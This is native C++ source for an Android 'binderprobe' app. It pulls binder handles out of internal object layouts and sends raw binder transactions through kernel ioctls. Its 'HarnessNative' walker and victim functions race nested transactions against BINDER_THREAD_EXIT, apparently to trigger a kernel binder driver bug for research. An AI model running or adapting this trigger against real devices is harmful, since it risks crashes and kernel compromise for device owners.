#include <android/binder_ibinder.h>
#include <android/binder_ibinder_jni.h>
#include <android/binder_parcel.h>
#include <android/log.h>
#include <jni.h>
#include <dlfcn.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/android/binder.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <pthread.h>

#define TAG "BinderProbeNative"

static void* dummyOnCreate(void*) { return nullptr; }
static void dummyOnDestroy(void*) {}
static binder_status_t dummyOnTransact(AIBinder*, transaction_code_t, const AParcel*, AParcel*) {
    return STATUS_OK;
}


static int find_binder_fd() {
    DIR* dir = opendir("/proc/self/fd");
    if (dir == nullptr) return -1;
    int found = -1;
    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        if (entry->d_name[0] == '.') continue;
        char path[64];
        snprintf(path, sizeof(path), "/proc/self/fd/%s", entry->d_name);
        char target[256];
        ssize_t n = readlink(path, target, sizeof(target) - 1);
        if (n <= 0) continue;
        target[n] = '\0';
        if (strstr(target, "binder") != nullptr) {
            int fd = atoi(entry->d_name);
            __android_log_print(ANDROID_LOG_INFO, TAG, "fd %d -> %s", fd, target);
            if (found < 0) found = fd;
        }
    }
    closedir(dir);
    return found;
}

static int32_t handle_from_java_binder(JNIEnv* env, jobject binder) {
    jclass cls = env->GetObjectClass(binder);
    jfieldID field = env->GetFieldID(cls, "mNativeData", "J");
    __android_log_print(ANDROID_LOG_INFO, TAG, "mNativeData field=%p", field);
    if (field == nullptr) { env->ExceptionClear(); return -1; }
    jlong native_data = env->GetLongField(binder, field);
    __android_log_print(ANDROID_LOG_INFO, TAG, "mNativeData=%lld", (long long)native_data);
    if (native_data == 0) return -1;
    void* ibinder = *reinterpret_cast<void**>(native_data);
    __android_log_print(ANDROID_LOG_INFO, TAG, "ibinder=%p", ibinder);
    if (ibinder == nullptr) return -1;
    int32_t handle = *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(ibinder) + 0x10);
    __android_log_print(ANDROID_LOG_INFO, TAG, "extracted handle=%d", handle);
    return handle;
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeRawTransact(
        JNIEnv* env, jobject, jobject binder, jint code, jint value) {
    int32_t handle = handle_from_java_binder(env, binder);
    int fd = find_binder_fd();
    __android_log_print(ANDROID_LOG_INFO, TAG, "raw handle=%d fd=%d", handle, fd);
    if (handle < 0 || fd < 0) return -10;
    struct {
        uint32_t command;
        struct binder_transaction_data transaction;
    } __attribute__((packed)) packet;
    memset(&packet, 0, sizeof(packet));
    packet.command = BC_TRANSACTION;
    packet.transaction.target.handle = (uint32_t)handle;
    packet.transaction.code = (uint32_t)code;
    packet.transaction.flags = 0;
    packet.transaction.data_size = sizeof(int32_t);
    packet.transaction.offsets_size = 0;
    packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)&value;
    packet.transaction.data.ptr.offsets = 0;
    unsigned char reply[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(packet);
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)(uintptr_t)reply;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "raw ioctl failed: %s", strerror(errno));
        return -11;
    }
    int32_t result = -12;
    size_t pos = 0;
    while (pos + 4 <= bwr.read_consumed) {
        uint32_t cmd;
        memcpy(&cmd, reply + pos, 4);
        pos += 4;
        if (cmd == BR_REPLY) {
            struct binder_transaction_data* tr = reinterpret_cast<struct binder_transaction_data*>(reply + pos);
            if (tr->data_size >= 4) memcpy(&result, (void*)(uintptr_t)tr->data.ptr.buffer, 4);
            struct {
                uint32_t command;
                binder_uintptr_t buffer;
            } __attribute__((packed)) free_packet;
            free_packet.command = BC_FREE_BUFFER;
            free_packet.buffer = tr->data.ptr.buffer;
            struct binder_write_read fbwr;
            memset(&fbwr, 0, sizeof(fbwr));
            fbwr.write_size = sizeof(free_packet);
            fbwr.write_buffer = (binder_uintptr_t)(uintptr_t)&free_packet;
            ioctl(fd, BINDER_WRITE_READ, &fbwr);
            break;
        }
        if (cmd == BR_FAILED_REPLY || cmd == BR_DEAD_REPLY) break;
        ssize_t extra = 0;
        switch (cmd) {
            case BR_TRANSACTION: case BR_REPLY: extra = sizeof(struct binder_transaction_data); break;
            case BR_TRANSACTION_SEC_CTX: extra = sizeof(struct binder_transaction_data_secctx); break;
            case BR_ERROR: case BR_ACQUIRE_RESULT: extra = 4; break;
            case BR_INCREFS: case BR_ACQUIRE: case BR_RELEASE: case BR_DECREFS: extra = 16; break;
            case BR_DEAD_BINDER: case BR_CLEAR_DEATH_NOTIFICATION_DONE: extra = 8; break;
            default: extra = 0; break;
        }
        pos += (size_t)extra;
    }
    __android_log_print(ANDROID_LOG_INFO, TAG, "raw transact reply=%d", result);
    return result;
}


static int32_t raw_transact_handle(int fd, int32_t handle, jint code, jint value) {
    if (handle < 0) return -20;
    struct {
        uint32_t command;
        struct binder_transaction_data transaction;
    } __attribute__((packed)) packet;
    memset(&packet, 0, sizeof(packet));
    packet.command = BC_TRANSACTION;
    packet.transaction.target.handle = (uint32_t)handle;
    packet.transaction.code = (uint32_t)code;
    packet.transaction.data_size = sizeof(int32_t);
    packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)&value;
    unsigned char reply[4096];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(packet);
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)(uintptr_t)reply;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) return -21;
    size_t pos = 0;
    while (pos + 4 <= bwr.read_consumed) {
        uint32_t cmd;
        memcpy(&cmd, reply + pos, 4);
        pos += 4;
        if (cmd == BR_REPLY) {
            struct binder_transaction_data* tr = reinterpret_cast<struct binder_transaction_data*>(reply + pos);
            int32_t result = -22;
            if (tr->data_size >= 4) memcpy(&result, (void*)(uintptr_t)tr->data.ptr.buffer, 4);
            struct { uint32_t command; binder_uintptr_t buffer; } __attribute__((packed)) fp;
            fp.command = BC_FREE_BUFFER; fp.buffer = tr->data.ptr.buffer;
            struct binder_write_read fbwr; memset(&fbwr, 0, sizeof(fbwr));
            fbwr.write_size = sizeof(fp); fbwr.write_buffer = (binder_uintptr_t)(uintptr_t)&fp;
            ioctl(fd, BINDER_WRITE_READ, &fbwr);
            return result;
        }
        if (cmd == BR_FAILED_REPLY || cmd == BR_DEAD_REPLY) return -23;
        ssize_t extra = 0;
        switch (cmd) {
            case BR_TRANSACTION: case BR_REPLY: extra = sizeof(struct binder_transaction_data); break;
            case BR_TRANSACTION_SEC_CTX: extra = sizeof(struct binder_transaction_data_secctx); break;
            case BR_ERROR: case BR_ACQUIRE_RESULT: extra = 4; break;
            case BR_INCREFS: case BR_ACQUIRE: case BR_RELEASE: case BR_DECREFS: extra = 16; break;
            case BR_DEAD_BINDER: case BR_CLEAR_DEATH_NOTIFICATION_DONE: extra = 8; break;
            default: extra = 0; break;
        }
        pos += (size_t)extra;
    }
    return -24;
}


extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeObjectHandles(
        JNIEnv* env, jobject, jobject binder, jint code, jint value) {
    jclass cls = env->GetObjectClass(binder);
    jfieldID field = env->GetFieldID(cls, "mObject", "J");
    if (field == nullptr) {
        env->ExceptionClear();
        field = env->GetFieldID(cls, "mNativeData", "J");
    }
    __android_log_print(ANDROID_LOG_INFO, TAG, "object field=%p", field);
    if (field == nullptr) { env->ExceptionClear(); return -40; }
    jlong raw = env->GetLongField(binder, field);
    __android_log_print(ANDROID_LOG_INFO, TAG, "object raw=%lld", (long long)raw);
    if (raw == 0) return -41;
    void* p = reinterpret_cast<void*>(raw);
    int32_t direct = *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(p) + 0x10);
    void* first = *reinterpret_cast<void**>(p);
    int32_t nested = first ? *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(first) + 0x10) : -1;
    int fd = find_binder_fd();
    __android_log_print(ANDROID_LOG_INFO, TAG, "object p=%p first=%p direct=%d nested=%d fd=%d", p, first, direct, nested, fd);
    int32_t r1 = raw_transact_handle(fd, direct, code, value);
    int32_t r2 = raw_transact_handle(fd, nested, code, value + 1);
    __android_log_print(ANDROID_LOG_INFO, TAG, "object raw results direct=%d nested=%d", r1, r2);
    return r1 == value + 1 ? r1 : (r2 == value + 2 ? r2 : -42);
}



static int32_t handle_of_data(jlong native_data) {
    void* p = reinterpret_cast<void*>(native_data);
    if (p == nullptr) return -1;
    void* ibinder = *reinterpret_cast<void**>(p);
    if (ibinder == nullptr) return -1;
    return *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(ibinder) + 0x10);
}

static int raw_send(int fd, int32_t handle, uint32_t code, uint32_t flags,
                    void* data, size_t size) {
    struct {
        uint32_t command;
        struct binder_transaction_data transaction;
    } __attribute__((packed)) packet;
    memset(&packet, 0, sizeof(packet));
    packet.command = BC_TRANSACTION;
    packet.transaction.target.handle = (uint32_t)handle;
    packet.transaction.code = code;
    packet.transaction.flags = flags;
    packet.transaction.data_size = size;
    packet.transaction.offsets_size = 0;
    packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)data;
    packet.transaction.data.ptr.offsets = 0;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(packet);
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) return -1;
    return bwr.write_consumed == sizeof(packet) ? 0 : -2;
}

static int wait_for_child(int fd, uint32_t expected_code) {
    unsigned char buffer[8192];
    for (int round = 0; round < 64; round++) {
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(buffer);
        bwr.read_buffer = (binder_uintptr_t)(uintptr_t)buffer;
        if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
            if (errno == EINTR) { round--; continue; }
            return -1;
        }
        size_t pos = 0;
        while (pos + 4 <= bwr.read_consumed) {
            uint32_t cmd;
            memcpy(&cmd, buffer + pos, 4);
            pos += 4;
            if (cmd == BR_TRANSACTION) {
                struct binder_transaction_data* tr =
                    reinterpret_cast<struct binder_transaction_data*>(buffer + pos);
                if (tr->code == expected_code) {
                    struct { uint32_t command; binder_uintptr_t buffer; } __attribute__((packed)) fp;
                    fp.command = BC_FREE_BUFFER; fp.buffer = tr->data.ptr.buffer;
                    struct binder_write_read fbwr; memset(&fbwr, 0, sizeof(fbwr));
                    fbwr.write_size = sizeof(fp); fbwr.write_buffer = (binder_uintptr_t)(uintptr_t)&fp;
                    ioctl(fd, BINDER_WRITE_READ, &fbwr);
                    return 0;
                }
                pos += sizeof(struct binder_transaction_data);
                continue;
            }
            if (cmd == BR_DEAD_REPLY || cmd == BR_FAILED_REPLY) return -2;
            ssize_t extra = 0;
            switch (cmd) {
                case BR_REPLY: extra = sizeof(struct binder_transaction_data); break;
                case BR_TRANSACTION_SEC_CTX: extra = sizeof(struct binder_transaction_data_secctx); break;
                case BR_ERROR: case BR_ACQUIRE_RESULT: extra = 4; break;
                case BR_INCREFS: case BR_ACQUIRE: case BR_RELEASE: case BR_DECREFS: extra = 16; break;
                case BR_DEAD_BINDER: case BR_CLEAR_DEATH_NOTIFICATION_DONE: extra = 8; break;
                default: extra = 0; break;
            }
            pos += (size_t)extra;
        }
    }
    return -3;
}

struct walker_arg { int fd; int32_t handle; int index; };

static void* walker_worker(void* opaque) {
    struct walker_arg* arg = reinterpret_cast<struct walker_arg*>(opaque);
    int fd = arg->fd;
    int32_t handle = arg->handle;
    int index = arg->index;
    free(arg);
    int send_rc = raw_send(fd, handle, 1, 0, nullptr, 0);
    int child_rc = wait_for_child(fd, 2);
    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d send=%d child=%d", index, send_rc, child_rc);
    if (child_rc == 0) {
        usleep(100000 + (useconds_t)index * 5000);
    }
    (void)ioctl(fd, BINDER_THREAD_EXIT, 0);
    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d exited", index);
    return nullptr;
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_HarnessNative_handleOf(
        JNIEnv*, jobject, jlong native_data) {
    return handle_of_data(native_data);
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_HarnessNative_walkerStart(
        JNIEnv*, jobject, jlong victim_native_data, jint threads) {
    int fd = find_binder_fd();
    int32_t handle = handle_of_data(victim_native_data);
    __android_log_print(ANDROID_LOG_INFO, TAG, "walkerStart fd=%d victim_handle=%d threads=%d", fd, handle, threads);
    if (fd < 0 || handle < 0) return -1;
    for (int i = 0; i < threads; i++) {
        struct walker_arg* arg = static_cast<struct walker_arg*>(malloc(sizeof(*arg)));
        if (arg == nullptr) break;
        arg->fd = fd; arg->handle = handle; arg->index = i;
        pthread_t thread;
        if (pthread_create(&thread, nullptr, walker_worker, arg) != 0) {
            free(arg);
            break;
        }
        pthread_detach(thread);
    }
    return 0;
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_HarnessNative_victimChild(
        JNIEnv*, jobject, jlong walker_native_data) {
    int fd = find_binder_fd();
    int32_t handle = handle_of_data(walker_native_data);
    __android_log_print(ANDROID_LOG_INFO, TAG, "victimChild fd=%d walker_handle=%d", fd, handle);
    if (fd < 0 || handle < 0) return -1;
    return raw_send(fd, handle, 2, 0, nullptr, 0);
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeHandleFromData(
        JNIEnv*, jobject, jlong native_data, jint code, jint value) {
    int fd = find_binder_fd();
    void* p = reinterpret_cast<void*>(native_data);
    if (p == nullptr || fd < 0) return -50;
    void* ibinder = *reinterpret_cast<void**>(p);
    int32_t h1 = *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(p) + 0x10);
    int32_t h2 = ibinder ? *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(ibinder) + 0x10) : -1;
    __android_log_print(ANDROID_LOG_INFO, TAG, "native_data=%p ibinder=%p h1=%d h2=%d fd=%d", p, ibinder, h1, h2, fd);
    int32_t r1 = raw_transact_handle(fd, h1, code, value);
    int32_t r2 = raw_transact_handle(fd, h2, code, value + 1);
    __android_log_print(ANDROID_LOG_INFO, TAG, "native_data raw results h1=%d h2=%d", r1, r2);
    return r1 == value + 1 ? r1 : (r2 == value + 2 ? r2 : -51);
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeRawHandle(
        JNIEnv*, jobject, jint handle, jint code, jint value) {
    int fd = find_binder_fd();
    int32_t result = raw_transact_handle(fd, handle, code, value);
    __android_log_print(ANDROID_LOG_INFO, TAG, "raw handle=%d fd=%d reply=%d", handle, fd, result);
    return result;
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeAIBinderHandles(
        JNIEnv* env, jobject, jobject binder, jint code, jint value) {
    AIBinder* native = AIBinder_fromJavaBinder(env, binder);
    if (native == nullptr) return -30;
    int fd = find_binder_fd();
    int32_t h1 = *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(native) + 0x10);
    void* p0 = *reinterpret_cast<void**>(native);
    int32_t h2 = p0 ? *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(p0) + 0x10) : -1;
    int32_t h3 = *reinterpret_cast<int32_t*>(reinterpret_cast<char*>(native));
    __android_log_print(ANDROID_LOG_INFO, TAG, "aibinder=%p p0=%p h1=%d h2=%d h3=%d fd=%d", native, p0, h1, h2, h3, fd);
    int32_t r1 = raw_transact_handle(fd, h1, code, value);
    int32_t r2 = raw_transact_handle(fd, h2, code, value + 1);
    int32_t r3 = raw_transact_handle(fd, h3, code, value + 2);
    __android_log_print(ANDROID_LOG_INFO, TAG, "aibinder raw results h1=%d h2=%d h3=%d", r1, r2, r3);
    AIBinder_decStrong(native);
    return r1 == value + 1 ? r1 : (r2 == value + 2 ? r2 : r3);
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeAssociatedTransact(
        JNIEnv* env, jobject, jobject binder, jint code, jint value) {
    AIBinder* native = AIBinder_fromJavaBinder(env, binder);
    if (native == nullptr) return -1;
    AIBinder_Class* clazz = AIBinder_Class_define("org.opencrown.Dummy",
        dummyOnCreate, dummyOnDestroy, dummyOnTransact);
    bool associated = AIBinder_associateClass(native, clazz);
    AParcel* in = nullptr;
    binder_status_t prep = AIBinder_prepareTransaction(native, &in);
    __android_log_print(ANDROID_LOG_INFO, TAG, "associated=%d prep=%d", associated, prep);
    if (prep != STATUS_OK || in == nullptr) { AIBinder_decStrong(native); return -2; }
    AParcel_writeInt32(in, value);
    AParcel* out = nullptr;
    binder_status_t status = AIBinder_transact(native, (transaction_code_t)code, &in, &out, 0);
    int32_t reply = -3;
    if (status == STATUS_OK && out != nullptr) AParcel_readInt32(out, &reply);
    __android_log_print(ANDROID_LOG_INFO, TAG, "associated transact status=%d reply=%d", status, reply);
    if (out != nullptr) AParcel_delete(out);
    AIBinder_decStrong(native);
    return reply;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeProbeLibbinder(JNIEnv*, jobject) {
    void* handle = dlopen("libbinder.so", RTLD_NOW);
    if (handle == nullptr) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "dlopen libbinder.so failed: %s", dlerror());
        return JNI_FALSE;
    }
    void* self = dlsym(handle, "_ZN7android10IPCThreadState4selfEv");
    __android_log_print(ANDROID_LOG_INFO, TAG, "libbinder loaded self=%p", self);
    return self != nullptr ? JNI_TRUE : JNI_FALSE;
}

extern "C" JNIEXPORT jint JNICALL
Java_org_opencrown_binderprobe_MainActivity_nativeTransact(
        JNIEnv* env, jobject /*thiz*/, jobject binder, jint code, jint value) {
    AIBinder* native = AIBinder_fromJavaBinder(env, binder);
    if (native == nullptr) {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "AIBinder_fromJavaBinder returned null");
        return -1;
    }
    AParcel* in = AParcel_create();
    AParcel* out = nullptr;
    AParcel_writeInt32(in, value);
    binder_status_t status = AIBinder_transact(native, (transaction_code_t)code, &in, &out, 0);
    int32_t reply = -3;
    if (status == STATUS_OK && out != nullptr) {
        AParcel_readInt32(out, &reply);
    } else {
        __android_log_print(ANDROID_LOG_ERROR, TAG, "transact failed: %d", status);
    }
    if (out != nullptr) AParcel_delete(out);
    AIBinder_decStrong(native);
    __android_log_print(ANDROID_LOG_INFO, TAG, "native transact code=%d value=%d reply=%d", code, value, reply);
    return reply;
}
